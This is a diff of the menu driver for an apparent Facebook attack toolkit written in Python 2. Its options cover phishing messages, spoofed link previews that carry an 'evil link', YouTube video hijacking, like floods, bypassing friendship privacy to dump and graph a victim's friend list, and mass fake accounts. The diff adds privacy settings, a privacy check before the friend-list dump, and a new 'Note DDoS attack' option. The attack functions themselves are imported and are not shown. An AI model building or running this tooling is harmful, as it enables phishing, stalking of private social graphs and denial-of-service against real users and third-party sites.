@@ -1,4 +1,4 @@
-from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts 
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS
 from database import connect,status
 from time import time
 import signal
@@ -8,6 +8,9 @@ from sys import stdin
 globalLogin = False
 globalEmail = ''
 globalPassword = ''
+
+privacy = {'0':'80','1':'40','2':'10'}
+privacySet = ['0','1','2']
 
 def main():
 
@@ -54,7 +57,8 @@ def main():
                (int(option) != 15) and (int(option) != 16) and 
                (int(option) != 17) and (int(option) != 18) and
                (int(option) != 19) and (int(option) != 20) and
-               (int(option) != 21) and (int(option) != 22)):
+               (int(option) != 21) and (int(option) != 22) and 
+               (int(option) != 23) and (int(option) != 24)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -66,7 +70,7 @@ def main():
             print '7)  Link Preview hack (Youtube version)\n'
             print '8)  Youtube hijack\n'
             print '9)  Private message, Link Preview hack (Simple web version)\n'
-            print '10)  Private message, Link Preview hack (Youtube version)\n'
+            print '10) Private message, Link Preview hack (Youtube version)\n'
             print '11) Like flood\n'
             print '12) Publish a post as an App (App Message Spoof)\n'
             print '13) Bypass friendship privacy\n'
@@ -78,7 +82,9 @@ def main():
             print '19) Set global login (Credentials stored in memory - Danger)\n'
             print '20) Print dead attacks :\'( \n'
             print '21) Send friend request to disclosed friend list from your account\n'
-            print '22) Close the application\n'
+            print '22) Bypass friendship (only .dot without graph integration)\n'
+            print '23) Note DDoS attack\n'
+            print '24) Close the application\n'
             
             choice = raw_input('Insert your choice: ')
             
@@ -151,13 +157,17 @@ def main():
                 password = globalPassword
             
             if (login(email,password,'real'))!= -1:
-                summary = raw_input('Insert a summary for the link: ')
-                link = raw_input('Insert de evil link: ')
-                realLink = raw_input('Insert de real link: ')
-                title = raw_input('Insert a title for the link: ')
-                image = raw_input('Insert the image url for the post: ')
-                comment = raw_input('Insert a comment for the post associated: ')
-                linkPreview(link,realLink,title,summary,comment,image)                
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:  
+                    summary = raw_input('Insert a summary for the link: ')
+                    link = raw_input('Insert de evil link: ')
+                    realLink = raw_input('Insert de real link: ')
+                    title = raw_input('Insert a title for the link: ')
+                    image = raw_input('Insert the image url for the post: ')
+                    comment = raw_input('Insert a comment for the post associated: ')
+                    linkPreview(link,realLink,title,summary,comment,image, privacy[option])
+                else:
+                    print "Wrong privacy value, try again "                
             
         
         if (int(option) == 7):
@@ -169,13 +179,17 @@ def main():
                 password = globalPassword
             
             if (login(email,password,'real'))!= -1:
-                summary = raw_input('Insert a summary for the video: ')
-                link = raw_input('Insert de evil link: ')
-                videoLink = raw_input('Insert de youtube link: ')
-                title = raw_input('Insert a title for the video: ')
-                videoID = raw_input('Insert the video ID (w?=): ')
-                comment = raw_input('Insert a comment for the post associated to the video: ')
-                linkPreviewYoutube(link,videoLink,title,summary,comment,videoID)
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    summary = raw_input('Insert a summary for the video: ')
+                    link = raw_input('Insert de evil link: ')
+                    videoLink = raw_input('Insert de youtube link: ')
+                    title = raw_input('Insert a title for the video: ')
+                    videoID = raw_input('Insert the video ID (w?=): ')
+                    comment = raw_input('Insert a comment for the post associated to the video: ')
+                    linkPreviewYoutube(link,videoLink,title,summary,comment,videoID,privacy[option])
+                else:
+                    print "Wrong privacy value, try again " 
         
         if (int(option) == 8):
             signal.signal(signal.SIGINT, signal_handler)
@@ -187,13 +201,17 @@ def main():
                 password = globalPassword
 
             if (login(email,password,'real'))!= -1:
-                summary = raw_input('Insert a summary for the video: ')
-                videoLink = raw_input('Insert de youtube link: ')
-                title = raw_input('Insert a title for the video: ')
-                videoID = raw_input('Insert the video ID (watch?v=): ')
-                comment = raw_input('Insert a comment for the post associated to the video: ')
-                hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=): ')
-                hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo)
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    summary = raw_input('Insert a summary for the video: ')
+                    videoLink = raw_input('Insert de youtube link: ')
+                    title = raw_input('Insert a title for the video: ')
+                    videoID = raw_input('Insert the video ID (watch?v=): ')
+                    comment = raw_input('Insert a comment for the post associated to the video: ')
+                    hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=): ')
+                    hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo)
+                else:
+                    print "Wrong privacy value, try again "
 
         if (int(option) == 9):
             signal.signal(signal.SIGINT, signal_handler)
@@ -308,18 +326,32 @@ def main():
 
             if (login(email,password,'real'))!= -1:
                 victim = raw_input('Insert the victim username or userId: ')
-                transitive = raw_input('Insert the transitive username or userId: ')
-                print 'The information will be stored in dumps\\%s\\%s.txt \n' %(victim,victim)
-                bypassFriendshipPrivacyPlot(victim, transitive)
+                check = checkPrivacy(victim)
+                if (check == -1):
+                    transitive = raw_input('Insert the transitive username or userId: ')
+                    print 'The information will be stored in dumps\\%s\\%s.txt \n' %(victim,victim)
+                    bypassFriendshipPrivacyPlot(victim, transitive)
+                else:
+                    friendList, friendsName = friendshipPlot(check,victim)
+                    simpleGraph(friendList, victim)
+                    print 'Friends available public ;D'
 
         
         if (int(option) == 15):
-            analize = int(raw_input('Analyze an existing one, or a new one? (0|1): '))
-            victim = raw_input('Insert the victim username or userId: ')
-            if (analize == 1):
-                analyzeGraph(victim)
+            
+            if (globalLogin == False):
+                email,password = setMail()
             else:
-                reAnalyzeGraph(victim)
+                email = globalEmail
+                password = globalPassword
+            
+            if (login(email,password,'real'))!= -1:
+                analize = int(raw_input('Analyze an existing one, or a new one? (0|1): '))
+                victim = raw_input('Insert the victim username or userId: ')
+                if (analize == 1):
+                    analyzeGraph(victim)
+                else:
+                    reAnalyzeGraph(victim)
         
         if (int(option) == 16):
             fileName = raw_input('Insert the victim username: ')
@@ -370,8 +402,47 @@ def main():
                     sendRequestToList(victim)
         
 
-        
         if (int(option) == 22):
+            signal.signal(signal.SIGINT, signal_handler)
+
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                victim = raw_input('Insert the victim username or userId: ')
+                check = checkPrivacy(victim)
+                if (check == -1):
+                    transitive = raw_input('Insert the transitive username or userId: ')
+                    print 'The information will be stored in dumps\\%s\\%s.txt \n' %(victim,victim)
+                    dotFile(victim, transitive)
+                else:
+                    print 'Friends publicly available ;D'
+                    friendList, friendsName = friendshipPlot(check,victim)
+                    simpleDotGraph(friendsName, victim)
+
+        if (int(option) == 23):
+            signal.signal(signal.SIGINT, signal_handler)
+            print 'Facebook note DDoS attack, discovered by chr13: http://chr13.com/about-me/'
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
+                imageURL = raw_input('Insert the image URL from the site attack: ')
+                noteID = raw_input('Insert the note ID: ')
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    noteDDoS(imageURL,noteID, privacy[option])
+        
+
+                    
+        if (int(option) == 24):
             connect.close()
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
